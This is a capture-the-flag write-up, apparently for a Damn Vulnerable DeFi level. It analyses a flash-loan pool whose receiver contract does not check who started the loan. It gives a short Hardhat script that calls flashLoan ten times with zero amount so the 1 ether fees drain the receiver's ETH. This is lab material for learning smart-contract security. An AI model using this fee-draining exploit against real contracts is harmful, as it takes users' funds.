# Goal
Drain all eth funds from the user

## Examning The Code
The fee is 1 ether, so for each time you call the flashLoan you must pay 1 ether.
The flashLoan function is call the receiver method:
```solidity
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");


        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        borrower.functionCallWithValue(
            abi.encodeWithSignature(
                "receiveEther(uint256)", // the receiver function
                FIXED_FEE
            ),
            borrowAmount
        );
        
        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }
```
If we go to the FlashLoanReceiver.sol contract the reciever function is public and it is only checking from where is the function flashLoan is being send.

## Exploiting 
We can send the flashLoan function and add the address of the receiver as a borrower and make the account 0, so he will pay 1 fee, run this for 10 times and we will drain all the eth.

## Solution
```javascript
const attackContract = this.pool.connect(attacker);
        for(let i=0;i<10;i++)
        {
            await attackContract.flashLoan(this.receiver.address, 0);
        } 
```